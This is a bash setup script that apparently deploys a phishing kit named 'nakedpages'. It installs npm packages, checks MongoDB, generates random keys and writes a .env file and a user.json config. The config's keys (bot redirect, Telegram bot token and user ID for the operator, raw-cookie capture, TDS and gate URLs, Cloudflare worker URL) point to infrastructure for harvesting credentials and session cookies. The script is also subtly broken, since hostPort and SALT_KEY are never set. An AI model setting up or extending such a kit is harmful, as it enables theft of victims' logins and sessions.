#!/usr/bin/env bash


echo "Installing Npm packages for worker"
npm install

mkdir -p database

mkdir -p config

echo "[]" > config/ssl.json


echo "Setting Up Enviromental Files"

echo "Checking Hostname IP....."
hostIp=`hostname -I|xargs`
echo "Host ip is $hostIp"

echo "Checking DB Port....."
nc -z 127.0.0.1 27017
if [ $? -ne 0 ]
then
	echo "DB Service not started, Exiting......"
	exit 1
fi
export MONGODB_URI="mongodb://localhost:27017/atx"


echo "Generating Secret....."
newSecret=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 32 | head -n 1)


echo "Generating Defaults......."
CUSTOM_PROJECT=project-custom
MANAGER_ID="betaman"

AUTO_DIR="auto"

RAW_COOKIES="NO"

SUBDOMAIN_CHAR="~"

LOG_FILE="nakedpages.log"

DEBUG_FILE="nakedpages-debug.log"

USER_CONFIG="config.json"

echo "Finished Generating Defaults......"

export SITE_KEY=$(cat /dev/urandom | tr -dc 'a-z' | fold -w 8 | head -n 1)


mkdir -p $CUSTOM_PROJECT


dbReturnCode=0

if [ $dbReturnCode -eq 0 ]
then
	echo "New DB installed...."
elif [ $dbReturnCode -eq 100 ]
then
	echo "Performing DB upgrade instead Your Secret KEY will not be shown"
	newSecret="OLD SECRET KEY"
else
	echo "DB setup failed with code $?"
	exit 1
fi



cat > ".env" <<- EOM
HOST_IP=$hostIp

MONGODB_URI=$MONGODB_URI

HOST_PORT=$hostPort

MANAGER_ID=$MANAGER_ID

AUTO_DIR=$AUTO_DIR

RAW_COOKIES=$RAW_COOKIES

SUBDOMAIN_CHAR=$SUBDOMAIN_CHAR

LOG_FILE=$LOG_FILE

DEBUG_FILE=$DEBUG_FILE

USER_CONFIG=$USER_CONFIG

CUSTOM_PROJECT=$CUSTOM_PROJECT
EOM



echo "All Ok.....Begining User Configurations/////"



printf '{ 
"BOT_REDIRECT": "https://example.com",

"TELEGRAM_BOT_TOKEN": "",

"TELEGRAM_USER_ID": "1",

"CURRENT_PROJECT": "default",

"SRC_KEY": "%s",

"GATE_KEY": "",

"TDS_URL": "http://127.0.0.1:5000",

"EXIT_URL": "",

"CF_WORKER_URL": "",

"SALT_KEY": "%s",

"ENABLE_PROXY": false,

"GLOBAL_AGENT_HTTP_PROXY": ""

}' "$SITE_KEY" "$SALT_KEY" > ./config/user.json


printf "\n\nFinish!\n"

